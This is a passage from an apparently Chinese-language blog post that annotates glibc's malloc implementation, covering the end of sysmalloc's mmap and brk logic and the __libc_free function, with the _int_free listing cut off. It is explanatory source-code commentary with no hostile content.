+ SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);  <br>      <span class="hljs-comment">//将tried_mmap置为true，表示当前尝试通过mmap分配内存</span><br>      tried_mmap = <span class="hljs-literal">true</span>;  <br>  <br>      <span class="hljs-comment">//防止内存大小溢出</span><br>      <span class="hljs-comment">//将size转化为无符号长整型进行比较，确保size不会溢出为负值</span><br>      <span class="hljs-comment">//如果size小于请求大小nb，意味着计算时可能发生了溢出，此时不会继续尝试mmap</span><br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))  <br>        &#123;  <br>      <span class="hljs-comment">//调用mmap分配内存</span><br>      <span class="hljs-comment">//0为系统选择映射地址，size调整页大小的分配内存大小</span><br>      <span class="hljs-comment">//PROT_READ|PROT_WRITE映射的内存可读可写</span><br>      <span class="hljs-comment">//0，不设置特殊标志，默认匿名映射</span><br>      <span class="hljs-comment">//如果分配成功返回一个指针，否则返回MAP_FAILED</span><br>          mm = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));  <br><br>  <span class="hljs-comment">//如果内存分配成功则执行</span><br>          <span class="hljs-keyword">if</span> (mm != MAP_FAILED)  <br>            &#123;  <br>              <span class="hljs-comment">/*</span><br><span class="hljs-comment">                 mmapped区域的开始偏移存储在区块的prev_size字段中。这允许我们在这里</span><br><span class="hljs-comment">                 和memalign()中调整返回的开始地址以满足对齐要求，并且仍然能够在</span><br><span class="hljs-comment">                 free()和realloc()中计算出正确的munmap参数地址。</span><br><span class="hljs-comment">              */</span><br>              <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)  <br>                &#123;  <br>                  <span class="hljs-comment">/* 对于glibc，chunk2mem增加地址2*SIZE_SZ，并且MALLOC_ALIGN_MASK是2*SIZE_SZ-1。</span><br><span class="hljs-comment">                     每个mmap区域都是页面对齐的，因此一定是MALLOC_ALIGN_MASK对齐的。*/</span>                  assert (((INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);  <br>                  front_misalign = <span class="hljs-number">0</span>;  <br>                &#125;  <br>              <span class="hljs-keyword">else</span>  <br>                front_misalign = (INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK;  <br>              <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>)  <br>                &#123;  <br>                  correction = MALLOC_ALIGNMENT - front_misalign;  <br>                  p = (mchunkptr) (mm + correction);  <br>                  p-&gt;prev_size = correction;  <br>                  set_head (p, (size - correction) | IS_MMAPPED);  <br>                &#125;  <br>              <span class="hljs-keyword">else</span>  <br>                &#123;  <br>                  p = (mchunkptr) mm;  <br>                  set_head (p, size | IS_MMAPPED);  <br>                &#125;  <br>  <br>              <span class="hljs-comment">/* 更新统计数据 */</span>  <br>  <br>              <span class="hljs-type">int</span> new = atomic_exchange_and_add (&amp;mp_.n_mmaps, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;  <br>              <span class="hljs-type">atomic_max</span> (&amp;mp_.max_n_mmaps, new);  <br>  <br>              <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum;  <br>              sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;  <br>              <span class="hljs-type">atomic_max</span> (&amp;mp_.max_mmapped_mem, sum);  <br>  <br>              check_chunk (av, p);  <br><br><span class="hljs-comment">//返回chunk</span><br>              <span class="hljs-keyword">return</span> chunk2mem (p);  <br>            &#125;  <br>        &#125;  <br>    &#125;  <br>  <br>  <span class="hljs-comment">/* 如果没有可用的arena，并且mmap也失败了则返回0 */</span>  <br>  <span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span>)  <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>  <br>  <span class="hljs-comment">/* 记录进入时top的配置 */</span>  <br>  <span class="hljs-comment">//记录top chunk</span><br>  old_top = av-&gt;top;  <br>  <br>  old_size = chunksize (old_top);  <br>  old_end = (<span class="hljs-type">char</span> *) (chunk_at_offset (old_top, old_size));  <br>  <br>  brk = snd_brk = (<span class="hljs-type">char</span> *) (MORECORE_FAILURE);  <br>  <br>  <span class="hljs-comment">/*如果不是第一次通过，我们需要old_size至少是MINSIZE，并且设置了prev_inuse位。*/</span><br>  assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||  <br>          ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;  <br>           prev_inuse (old_top) &amp;&amp;  <br>           ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));  <br>  <br>   <span class="hljs-comment">/* 前提条件: 当前空间不足以满足nb请求 */</span><br>  assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE));  <br>  <br>  <span class="hljs-comment">// 如果av不是主arena，则尝试扩展当前堆或创建新堆。</span><br>  <span class="hljs-keyword">if</span> (av != &amp;main_arena)  <br>    &#123;  <br>      heap_info *old_heap, *heap;  <br>      <span class="hljs-type">size_t</span> old_heap_size;  <br>  <br>        <span class="hljs-comment">/* 首先尝试扩展当前堆。 */</span><br>      old_heap = heap_for_ptr (old_top);  <br>      old_heap_size = old_heap-&gt;size;  <br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">long</span>) (MINSIZE + nb - old_size) &gt; <span class="hljs-number">0</span>  <br>          &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="hljs-number">0</span>)  <br>        &#123;  <br>          av-&gt;system_mem += old_heap-&gt;size - old_heap_size;  <br>          arena_mem += old_heap-&gt;size - old_heap_size;  <br>          set_head (old_top, (((<span class="hljs-type">char</span> *) old_heap + old_heap-&gt;size) - (<span class="hljs-type">char</span> *) old_top)  <br>                    | PREV_INUSE);  <br>        &#125;  <br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="hljs-keyword">sizeof</span> (*heap)), mp_.top_pad)))  <br>        &#123;  <br>          <span class="hljs-comment">/* Use a newly allocated heap.  */</span>  <br>          heap-&gt;ar_ptr = av;  <br>          heap-&gt;prev = old_heap;  <br>          av-&gt;system_mem += heap-&gt;size;  <br>          arena_mem += heap-&gt;size;  <br>          <span class="hljs-comment">/* Set up the new top.  */</span>  <br>          top (av) = chunk_at_offset (heap, <span class="hljs-keyword">sizeof</span> (*heap));  <br>          set_head (top (av), (heap-&gt;size - <span class="hljs-keyword">sizeof</span> (*heap)) | PREV_INUSE);  <br>  <br>          <span class="hljs-comment">/* Setup fencepost and free the old top chunk with a multiple of  </span><br><span class="hljs-comment">             MALLOC_ALIGNMENT in size. */</span>          <span class="hljs-comment">/* The fencepost takes at least MINSIZE bytes, because it might             become the top chunk again later.  Note that a footer is set             up, too, although the chunk is marked in use. */</span>          old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;  <br>          set_head (chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ), <span class="hljs-number">0</span> | PREV_INUSE);  <br>          <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)  <br>            &#123;  <br>              set_head (chunk_at_offset (old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);  <br>              set_foot (chunk_at_offset (old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ));  <br>              set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);  <br>              _int_free (av, old_top, <span class="hljs-number">1</span>);  <br>            &#125;  <br>          <span class="hljs-keyword">else</span>  <br>            &#123;  <br>              set_head (old_top, (old_size + <span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);  <br>              set_foot (old_top, (old_size + <span class="hljs-number">2</span> * SIZE_SZ));  <br>            &#125;  <br>        &#125;  <br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!tried_mmap)  <br>        <span class="hljs-comment">/* We can at least try to use to mmap memory.  */</span>  <br>        <span class="hljs-keyword">goto</span> try_mmap;  <br>    &#125;  <br>  <span class="hljs-keyword">else</span>     <span class="hljs-comment">/* av == main_arena */</span>  <br>  <br>  <br>    &#123; <span class="hljs-comment">/* Request enough space for nb + pad + overhead */</span>  <br>      size = nb + mp_.top_pad + MINSIZE;  <br>  <br>       <span class="hljs-comment">/*</span><br><span class="hljs-comment">         如果是连续的，我们可以减去希望与新空间合并的现有空间。</span><br><span class="hljs-comment">         我们稍后只在我们实际没有获得连续空间时再加回来。</span><br><span class="hljs-comment">       */</span><br>      <span class="hljs-keyword">if</span> (contiguous (av))  <br>        size -= old_size;  <br>  <br>       <span class="hljs-comment">/*</span><br><span class="hljs-comment">         将大小调整为页的倍数。</span><br><span class="hljs-comment">         如果MORECORE不是连续的，这确保我们只用整页参数调用它。</span><br><span class="hljs-comment">         并且如果MORECORE是连续的，并且这不是第一次通过，</span><br><span class="hljs-comment">         这会保持先前调用的页对齐。</span><br><span class="hljs-comment">       */</span> <br>      size = ALIGN_UP (size, pagesize);  <br>  <br>      <span class="hljs-comment">/*  </span><br><span class="hljs-comment">         Don&#x27;t try to call MORECORE if argument is so big as to appear         negative. Note that since mmap takes size_t arg, it may succeed         below even if we cannot call MORECORE.       */</span>  <br>      <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">0</span>)  <br>        &#123;  <br>          brk = (<span class="hljs-type">char</span> *) (MORECORE (size));  <br>          LIBC_PROBE (memory_sbrk_more, <span class="hljs-number">2</span>, brk, size);  <br>        &#125;  <br>  <br>      <span class="hljs-keyword">if</span> (brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))  <br>        &#123;  <br>          <span class="hljs-comment">/* Call the `morecore&#x27; hook if necessary.  */</span>  <br>          <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span>) = atomic_forced_read (__after_morecore_hook);  <br>          <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))  <br>            (*hook)();  <br>        &#125;  <br>      <span class="hljs-keyword">else</span>  <br>        &#123;  <br>          <span class="hljs-comment">/*  </span><br><span class="hljs-comment">             If have mmap, try using it as a backup when MORECORE fails or             cannot be used. This is worth doing on systems that have &quot;holes&quot; in             address space, so sbrk cannot extend to give contiguous space, but             space is available elsewhere.  Note that we ignore mmap max count             and threshold limits, since the space will not be used as a             segregated mmap region.           */</span>  <br>          <span class="hljs-comment">/* Cannot merge with old top, so add its size back in */</span>          <span class="hljs-keyword">if</span> (contiguous (av))  <br>            size = ALIGN_UP (size + old_size, pagesize);  <br>  <br>          <span class="hljs-comment">/* If we are relying on mmap as backup, then use larger units */</span>  <br>          <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (MMAP_AS_MORECORE_SIZE))  <br>            size = MMAP_AS_MORECORE_SIZE;  <br>  <br>          <span class="hljs-comment">/* Don&#x27;t try if size wraps around 0 */</span>  <br>          <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))  <br>            &#123;  <br>              <span class="hljs-type">char</span> *mbrk = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));  <br>  <br>              <span class="hljs-keyword">if</span> (mbrk != MAP_FAILED)  <br>                &#123;  <br>                  <span class="hljs-comment">/* We do not need, and cannot use, another sbrk call to find end */</span>  <br>                  brk = mbrk;  <br>                  snd_brk = brk + size;  <br>  <br>                  <span class="hljs-comment">/*  </span><br><span class="hljs-comment">                     Record that we no longer have a contiguous sbrk region.                     After the first time mmap is used as backup, we do not                     ever rely on contiguous space since this could incorrectly                     bridge regions.                   */</span>                  set_noncontiguous (av);  <br>                &#125;  <br>            &#125;  <br>        &#125;  <br>  <br>      <span class="hljs-keyword">if</span> (brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))  <br>        &#123;  <br>          <span class="hljs-keyword">if</span> (mp_.sbrk_base == <span class="hljs-number">0</span>)  <br>            mp_.sbrk_base = brk;  <br>          av-&gt;system_mem += size;  <br>  <br>          <span class="hljs-comment">/*  </span><br><span class="hljs-comment">             If MORECORE extends previous space, we can likewise extend top size.           */</span>  <br>          <span class="hljs-keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))  <br>            set_head (old_top, (size + old_size) | PREV_INUSE);  <br>  <br>          <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)  <br>            &#123;  <br>              <span class="hljs-comment">/* Oops!  Someone else killed our space..  Can&#x27;t touch anything.  */</span>  <br>              malloc_printerr (<span class="hljs-number">3</span>, <span class="hljs-string">&quot;break adjusted to free malloc space&quot;</span>, brk,  <br>           av);  <br>            &#125;  <br>  <br>          <span class="hljs-comment">/*  </span><br><span class="hljs-comment">             Otherwise, make adjustments:  </span><br><span class="hljs-comment">           * If the first time through or noncontiguous, we need to call sbrk              just to find out where the end of memory lies.  </span><br><span class="hljs-comment">           * We need to ensure that all returned chunks from malloc will meet              MALLOC_ALIGNMENT  </span><br><span class="hljs-comment">           * If there was an intervening foreign sbrk, we need to adjust sbrk              request size to account for fact that we will not be able to              combine new space with existing space in old_top.  </span><br><span class="hljs-comment">           * Almost all systems internally allocate whole pages at a time, in              which case we might as well use the whole last page of request.              So we allocate enough more memory to hit a page boundary now,              which in turn causes future contiguous calls to page-align.           */</span>  <br>          <span class="hljs-keyword">else</span>  <br>            &#123;  <br>              front_misalign = <span class="hljs-number">0</span>;  <br>              end_misalign = <span class="hljs-number">0</span>;  <br>              correction = <span class="hljs-number">0</span>;  <br>              aligned_brk = brk;  <br>  <br>              <span class="hljs-comment">/* handle contiguous cases */</span>  <br>              <span class="hljs-keyword">if</span> (contiguous (av))  <br>                &#123;  <br>                  <span class="hljs-comment">/* Count foreign sbrk as system_mem.  */</span>  <br>                  <span class="hljs-keyword">if</span> (old_size)  <br>                    av-&gt;system_mem += brk - old_end;  <br>  <br>                  <span class="hljs-comment">/* Guarantee alignment of first new chunk made from this space */</span>  <br>  <br>                  front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;  <br>                  <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>)  <br>                    &#123;  <br>                      <span class="hljs-comment">/*  </span><br><span class="hljs-comment">                         Skip over some bytes to arrive at an aligned position.                         We don&#x27;t need to specially mark these wasted front bytes.                         They will never be accessed anyway because                         prev_inuse of av-&gt;top (and any chunk created from its start)                         is always true after initialization.                       */</span>  <br>                      correction = MALLOC_ALIGNMENT - front_misalign;  <br>                      aligned_brk += correction;  <br>                    &#125;  <br>  <br>                  <span class="hljs-comment">/*  </span><br><span class="hljs-comment">                     If this isn&#x27;t adjacent to existing space, then we will not                     be able to merge with old_top space, so must add to 2nd request.                   */</span>  <br>                  correction += old_size;  <br>  <br>                  <span class="hljs-comment">/* Extend the end address to hit a page boundary */</span>  <br>                  end_misalign = (INTERNAL_SIZE_T) (brk + size + correction);  <br>                  correction += (ALIGN_UP (end_misalign, pagesize)) - end_misalign;  <br>  <br>                  assert (correction &gt;= <span class="hljs-number">0</span>);  <br>                  snd_brk = (<span class="hljs-type">char</span> *) (MORECORE (correction));  <br>  <br>                  <span class="hljs-comment">/*  </span><br><span class="hljs-comment">                     If can&#x27;t allocate correction, try to at least find out current                     brk.  It might be enough to proceed without failing.  </span><br><span class="hljs-comment">                     Note that if second sbrk did NOT fail, we assume that space                     is contiguous with first sbrk. This is a safe assumption unless                     program is multithreaded but doesn&#x27;t use locks and a foreign sbrk                     occurred between our first and second calls.                   */</span>  <br>                  <span class="hljs-keyword">if</span> (snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))  <br>                    &#123;  <br>                      correction = <span class="hljs-number">0</span>;  <br>                      snd_brk = (<span class="hljs-type">char</span> *) (MORECORE (<span class="hljs-number">0</span>));  <br>                    &#125;  <br>                  <span class="hljs-keyword">else</span>  <br>                    &#123;  <br>                      <span class="hljs-comment">/* Call the `morecore&#x27; hook if necessary.  */</span>  <br>                      <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span>) = atomic_forced_read (__after_morecore_hook);  <br>                      <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))  <br>                        (*hook)();  <br>                    &#125;  <br>                &#125;  <br>  <br>              <span class="hljs-comment">/* handle non-contiguous cases */</span>  <br>              <span class="hljs-keyword">else</span>  <br>                &#123;  <br>                  <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)  <br>                    <span class="hljs-comment">/* MORECORE/mmap must correctly align */</span>  <br>                    assert (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);  <br>                  <span class="hljs-keyword">else</span>  <br>                    &#123;  <br>                      front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;  <br>                      <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>)  <br>                        &#123;  <br>                          <span class="hljs-comment">/*  </span><br><span class="hljs-comment">                             Skip over some bytes to arrive at an aligned position.                             We don&#x27;t need to specially mark these wasted front bytes.                             They will never be accessed anyway because                             prev_inuse of av-&gt;top (and any chunk created from its start)                             is always true after initialization.                           */</span>  <br>                          aligned_brk += MALLOC_ALIGNMENT - front_misalign;  <br>                        &#125;  <br>                    &#125;  <br>  <br>                  <span class="hljs-comment">/* Find out current end of memory */</span>  <br>                  <span class="hljs-keyword">if</span> (snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))  <br>                    &#123;  <br>                      snd_brk = (<span class="hljs-type">char</span> *) (MORECORE (<span class="hljs-number">0</span>));  <br>                    &#125;  <br>                &#125;  <br>  <br>              <span class="hljs-comment">/* Adjust top based on results of second sbrk */</span>  <br>              <span class="hljs-keyword">if</span> (snd_brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))  <br>                &#123;  <br>                  av-&gt;top = (mchunkptr) aligned_brk;  <br>                  set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);  <br>                  av-&gt;system_mem += correction;  <br>  <br>                  <span class="hljs-comment">/*  </span><br><span class="hljs-comment">                     If not the first time through, we either have a                     gap due to foreign sbrk or a non-contiguous region.  Insert a                     double fencepost at old_top to prevent consolidation with space                     we don&#x27;t own. These fenceposts are artificial chunks that are                     marked as inuse and are in any case too small to use.  We need                     two to make sizes and alignments work out.                   */</span>  <br>                  <span class="hljs-keyword">if</span> (old_size != <span class="hljs-number">0</span>)  <br>                    &#123;  <br>                      <span class="hljs-comment">/*  </span><br><span class="hljs-comment">                         Shrink old_top to insert fenceposts, keeping size a                         multiple of MALLOC_ALIGNMENT. We know there is at least                         enough space in old_top to do this.                       */</span>                      old_size = (old_size - <span class="hljs-number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;  <br>                      set_head (old_top, old_size | PREV_INUSE);  <br>  <br>                      <span class="hljs-comment">/*  </span><br><span class="hljs-comment">                         Note that the following assignments completely overwrite                         old_top when old_size was previously MINSIZE.  This is                         intentional. We need the fencepost, even if old_top otherwise gets                         lost.                       */</span>                      chunk_at_offset (old_top, old_size)-&gt;size =  <br>                        (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE;  <br>  <br>                      chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ)-&gt;size =  <br>                        (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE;  <br>  <br>                      <span class="hljs-comment">/* If possible, release the rest. */</span>  <br>                      <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)  <br>                        &#123;  <br>                          _int_free (av, old_top, <span class="hljs-number">1</span>);  <br>                        &#125;  <br>                    &#125;  <br>                &#125;  <br>            &#125;  <br>        &#125;  <br>    &#125; <span class="hljs-comment">/* if (av !=  &amp;main_arena) */</span>  <br>  <br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) av-&gt;system_mem &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (av-&gt;max_system_mem))  <br>    av-&gt;max_system_mem = av-&gt;system_mem;  <br>  check_malloc_state (av);  <br>  <br>  <span class="hljs-comment">/* finally, do the allocation */</span>  <br>  p = av-&gt;top;  <br>  size = chunksize (p);  <br>  <br>  <span class="hljs-comment">/* check that one of the above allocation paths succeeded */</span>  <br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))  <br>    &#123;  <br>      remainder_size = size - nb;  <br>      remainder = chunk_at_offset (p, nb);  <br>      av-&gt;top = remainder;  <br>      set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));  <br>      set_head (remainder, remainder_size | PREV_INUSE);  <br>      check_malloced_chunk (av, p, nb);  <br>      <span class="hljs-keyword">return</span> chunk2mem (p);  <br>    &#125;  <br>  <br>  <span class="hljs-comment">/* catch all failure paths */</span>  <br>  __set_errno (ENOMEM);  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="释放过程"><a href="#释放过程" class="headerlink" title="释放过程"></a>释放过程</h2><h2 id="free源码分析"><a href="#free源码分析" class="headerlink" title="free源码分析"></a>free源码分析</h2><h3 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a><code>__libc_free</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br>  <span class="hljs-comment">// 调用 __free_hook ，参数是是否的内存的地址。</span><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br> <br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)                              <span class="hljs-comment">/* free(0) has no effect */</span><br>    <span class="hljs-keyword">return</span>;<br> <br>  p = mem2chunk (mem);<br>  <span class="hljs-comment">// 如果是 mmapp 得到的内存单独处理</span><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span><br>      <span class="hljs-comment">// 释放的内存大小如果大于 mmap_threshold 并且小于 DEFAULT_MMAP_THRESHOLD_MAX(0x20000)</span><br>      <span class="hljs-comment">// 则更新 mmap_threshold 为释放内存的大小，trim_threshold 为两倍释放内存的大小。</span><br>      <span class="hljs-comment">// 其中 mmap_threshold 是 sysmalloc 中 brk 和 mmap 两种系统调用获取内存的选择的边界值</span><br>      <span class="hljs-comment">// trim_threshold 为是否 systrim 减少 ptmalloc 保留内存的参考值</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold<br>          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      <span class="hljs-comment">// 调用 nummap 释放内存</span><br>      munmap_chunk (p);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br> <br>  <span class="hljs-comment">// 调用 _int_free 释放内存</span><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a><code>_int_free</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span 